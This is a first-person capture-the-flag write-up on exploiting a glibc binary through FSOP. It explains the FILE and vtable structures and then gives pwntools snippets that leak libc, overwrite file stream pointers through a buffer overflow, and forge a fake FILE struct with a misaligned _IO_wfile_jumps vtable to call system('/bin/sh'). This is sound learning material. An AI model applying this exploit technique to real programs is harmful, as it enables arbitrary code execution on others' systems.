This challenge was tough since I have not really touched on anything FSOP related outside of House of Orange, but it was for sure a great learning experience. I will say this out of the gate, I did not solve this challenge during the CTF but instead I continued to work on it for over the course of two weeks since to be honest there was a lot to learn.

To first understand how to solve this challenge, I will have to explain what file structures are. From what I understand and what I learned through debugging the heap memory, file structures are mostly here so whatever changes I do to the file that I wish to open will happen in heap memory first and once you call `fclose()` on the file pointer, then it will write to the disk. This is done because in C they legit only care about speed and nothing else, so that is good for us.

Now how FSOP works takes advantage of the `__IO_FILE_plus` struct that is used when working with file structures. The struct looks like this:

``` c
struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
```

The real point of focus is the `vtable` at the end. Luckily, I already knew what a `vtable` was thanks to one of the challenges in the [pwnable.kr](https://pwnable.kr) website that I solved a little while back. In that challenge, from what I remember, I had to exploit a use-after-free bug in a C++ program that used objects. The way `vtables` are used in C++ is basically a lookup table for functions for each object, so for example multiple instances of a class will actually end up calling the same function addresses. And in this case the `vtable` pointer is the same way. Only problem though (and why the House of Orange only works on GLIBC 2.23 and below), the `vtable` pointer has to be within some adresses. Because of that, we cannot create our own `vtable` and instead we must play around with misaligning the vtable that we have and to try to find something that is modifyable by using [Angry FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/). Also here is the layout of the `_IO_FILE` structure for future reference (since this will show up in the heap):

``` c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

Now with this knowledge, we will be able to solve this challenge. Also I took these structures from [here](https://niftic.ca/posts/fsop/).

The challenge calls `fread()` and `fwrite()` on different options and has an obvious buffer overflow that will let us overwrite both file structures for the read and write. Also everything is green except for PIE, so what I did was leak LIBC by reading the address of `stdout` in the `.bss` region by changing the pointer of the read file structure. I also leaked the stack but I didn't need it:

``` python
    leak = read_addr(io, 0x404010)
    libc = int.from_bytes(leak, "little") - l.sym["_IO_2_1_stdout_"] 

    print(f"============= Libc leak: {hex(libc)}")
    
    leak = read_addr(io, l.sym["environ"] + libc)
    stack = int.from_bytes(leak, "little") 

    print(f"============= Stack leak: {hex(stack)}")
```

Next I  overwrote (is that how you say it??) the write file structure to point to libc's `_IO_2_1_stdout_`:

``` python
    # buf base and buf end overflow on the write stream 
    payload = b"A"*0x28 + p64(0x1e1) + b"B"*0x1d8 + p64(0x1e1) 
    payload += p64(0xfbad2c84)
    payload += p64(l.sym["_IO_2_1_stdout_"] + libc)
    payload += p64(0) * 5
    payload += p64(l.sym["_IO_2_1_stdout_"] + libc)
    payload += p64(l.sym["_IO_2_1_stdout_"] + libc + 0x200)
    
    write_script(io, b"balls")
    set_name(io, payload)
```

Then I created a fake file structure while changing the `vtable` pointer to what angry-fsrop said:
``` python 
# create a fake file struct to use when calling the write stream
    file = FileStructure()
    file._IO_read_end = l.sym["system"] + libc
    file._IO_save_base = libc + 0x163830 # one gadget
    file._IO_write_end = u64(b"/bin/sh\x00")
    file._lock = libc + 0x21ba70
    file._codecvt = l.sym["_IO_2_1_stdout_"] + libc + 0xb8
    file._wide_data = l.sym["_IO_2_1_stdout_"] + libc + 0x200
    
    # modify the address of the vtable
    file.unknown2 = p64(0)*2 + p64(l.sym["_IO_2_1_stdout_"] + libc + 0x20) + p64(0)*3 + p64(l.sym["_IO_wfile_jumps"] + libc - 0x18) 

    #write_script(io, bytes(file))
    sla(io, b"Choice:", b"2")
    io.sendline(bytes(file))
```

And just like that, I have shell!!!! (WOOHOO, this was a pain!!!!)
